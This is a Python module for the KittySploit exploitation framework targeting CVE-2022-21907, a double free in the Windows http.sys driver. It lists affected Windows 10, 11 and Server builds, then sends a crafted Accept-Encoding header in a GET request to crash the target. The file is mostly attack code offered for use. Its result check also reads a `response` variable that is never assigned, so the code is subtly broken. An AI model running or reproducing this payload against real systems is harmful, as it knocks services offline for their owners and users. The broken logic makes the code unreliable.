from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Auxiliary, Http_client):

	__info__ = {
		"name": "Windows http.sys Driver DoS",
		"description": "Windows http.sys double free causing DoS.",
		"author": "KittySploit Team",
		"cve": "2022-21907",
		"targets" : ["Windows 10 Version 1809 for 32-bit Systems",
					"Windows 10 Version 1809 for x64-based Systems",
					"Windows 10 Version 1809 for ARM64-based Systems",
					"Windows 10 Version 21H1 for 32-bit Systems",
					"Windows 10 Version 21H1 for x64-based System",
					"Windows 10 Version 21H1 for ARM64-based Systems",
					"Windows 10 Version 20H2 for 32-bit Systems",
					"Windows 10 Version 20H2 for x64-based Systems",
					"Windows 10 Version 20H2 for ARM64-based Systems",
					"Windows 10 Version 21H2 for 32-bit Systems",
					"Windows 10 Version 21H2 for x64-based Systems",
					"Windows 10 Version 21H2 for ARM64-based Systems",

					"Windows 11 for x64-based Systems",
					"Windows 11 for ARM64-based Systems",

					"Windows Server 2019 and Core Installation",
					"Windows Server 2022 and Server Core Installation",
					"Windows Server 20H2 Server Core Installation"]
	}
		
	def run(self):

		print_status("Crafting malicious payload...")

		payload = 'A' * 24 + ','
		payload += 'A' * 60 + '&'
		payload += 'A' * 2 + '&' + '*' * 2
		payload += 'A' * 20 + '*' * 2
		payload += 'A' + ','
		payload += 'A' * 73 + ','
		payload += 'A' * 71 + ','
		payload += 'A' * 27 + ',' + '*' * 28
		payload += 'A' * 6 + ',' + ' ' + '*' + ',' + ' ' + ','

		headers = {
			"Accept-Encoding": payload
		}

		self.http_request(
			method="GET",
			headers=headers
		)
		if response.status_code == 200:
			print_success("Payload sent successfully")
			Vulnerable.SUCCESS()
		else:
			print_error("Payload sent failed")
			fail.NotVulnerable()
